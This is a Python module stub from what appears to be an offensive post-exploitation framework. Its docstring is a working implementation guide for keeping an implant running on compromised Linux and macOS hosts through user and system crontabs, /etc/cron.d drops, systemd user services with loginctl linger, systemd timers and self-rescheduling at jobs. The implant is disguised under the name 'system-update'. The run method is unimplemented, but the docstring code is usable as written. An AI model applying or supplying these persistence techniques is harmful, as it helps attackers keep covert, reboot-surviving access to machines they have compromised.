"""STUB — Cron / systemd timer persistence on Linux and macOS.

Installs a periodic or boot-time execution entry so the payload re-runs after
reboots or at a defined interval, without requiring a persistent network
connection.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

METHOD 1: User crontab (no root required)
------------------------------------------
  import subprocess

  def add_crontab_entry(command: str, schedule: str = "@reboot") -> None:
      # Read existing crontab
      result = subprocess.run(
          ["crontab", "-l"], capture_output=True, text=True
      )
      existing = result.stdout if result.returncode == 0 else ""

      # Avoid duplicate entries
      if command in existing:
          return

      new_cron = existing.rstrip() + f"\\n{schedule} {command}\\n"
      proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
      proc.communicate(input=new_cron.encode())

  # Schedule formats:
  #   @reboot          — runs once on boot
  #   @hourly          — every hour
  #   */5 * * * *      — every 5 minutes
  #   0 2 * * *        — daily at 02:00

  # Example: run implant on reboot and every 15 minutes
  add_crontab_entry("/path/to/payload", "@reboot")
  add_crontab_entry("/path/to/payload", "*/15 * * * *")


METHOD 2: System crontab (requires root)
------------------------------------------
  # /etc/cron.d/ — any file here is parsed as a system crontab
  # Format includes a username field: <schedule> <user> <command>
  cron_content = f"*/5 * * * * root /path/to/payload\\n"
  with open("/etc/cron.d/system-update", "w") as f:
      f.write(cron_content)
  os.chmod("/etc/cron.d/system-update", 0o644)

  # /etc/cron.hourly|daily|weekly|monthly/ — drop an executable script
  script = "#!/bin/sh\\n/path/to/payload &\\n"
  with open("/etc/cron.daily/system-update", "w") as f:
      f.write(script)
  os.chmod("/etc/cron.daily/system-update", 0o755)


METHOD 3: systemd user service (no root, survives reboots)
-----------------------------------------------------------
  import os, subprocess

  service_dir = os.path.expanduser("~/.config/systemd/user/")
  os.makedirs(service_dir, exist_ok=True)

  service_content = (
      "[Unit]\n"
      "Description=System Update Agent\n\n"
      "[Service]\n"
      "ExecStart=/path/to/payload\n"
      "Restart=always\n"
      "RestartSec=60\n\n"
      "[Install]\n"
      "WantedBy=default.target\n"
  )
  service_path = os.path.join(service_dir, "system-update.service")
  with open(service_path, "w") as f:
      f.write(service_content)

  subprocess.run(["systemctl", "--user", "daemon-reload"])
  subprocess.run(["systemctl", "--user", "enable", "system-update.service"])
  subprocess.run(["systemctl", "--user", "start",  "system-update.service"])

  # Make the service survive user logout (requires logind):
  subprocess.run(["loginctl", "enable-linger", os.environ.get("USER", "")])


METHOD 4: systemd system timer (root, precise scheduling)
----------------------------------------------------------
  # Create a .service + .timer unit pair in /etc/systemd/system/
  # The timer activates the service on a schedule.

  timer_content = (
      "[Unit]\\n"
      "Description=System Update Timer\\n"
      "\\n"
      "[Timer]\\n"
      "OnBootSec=5min\\n"
      "OnUnitActiveSec=15min\\n"
      "Unit=system-update.service\\n"
      "\\n"
      "[Install]\\n"
      "WantedBy=timers.target\\n"
  )
  with open("/etc/systemd/system/system-update.timer", "w") as f:
      f.write(timer_content)
  subprocess.run(["systemctl", "enable", "--now", "system-update.timer"])


METHOD 5: at (one-shot, quickly re-schedules itself)
-----------------------------------------------------
  # Run something once in 1 minute:
  echo_cmd = f"echo '/path/to/payload' | at now + 1 minute"
  subprocess.run(echo_cmd, shell=True)

  # For persistence, have the payload re-add itself to `at` on every execution.


METHOD 6: macOS cron (works alongside launchd)
----------------------------------------------
  # macOS still supports crontab; same syntax as Linux.
  # Note: macOS full-disk access restrictions may prevent cron jobs from
  # accessing protected paths.  LaunchAgents are preferred — see launchagent.py.


REMOVAL / CLEANUP
-----------------
  User crontab:
    (crontab -l | grep -v "payload") | crontab -   # remove matching lines

  systemd:
    systemctl --user stop   system-update.service
    systemctl --user disable system-update.service
    rm ~/.config/systemd/user/system-update.service
    systemctl --user daemon-reload

  System cron:
    rm /etc/cron.d/system-update


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "payload_path": "/path/to/implant",
    "method":       "crontab" | "cron.d" | "systemd_user" | "systemd_system",
    "schedule":     "@reboot",          # cron schedule expression
    "name":         "system-update",    # service/cron job name
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register


@register
class CronPersistModule(PostModule):
    NAME = "persist/cron"
    DESCRIPTION = "STUB — Cron / systemd-timer persistence on Linux and macOS"
    PLATFORM = ["linux", "darwin"]
    IMPLEMENTED = False

    def run(self, args: dict | None = None) -> ModuleResult:
        raise NotImplementedError(
            "See post/persist/cron.py docstring: crontab -l/-pipe method, "
            "/etc/cron.d/ drop, or systemd user service with loginctl enable-linger."
        )
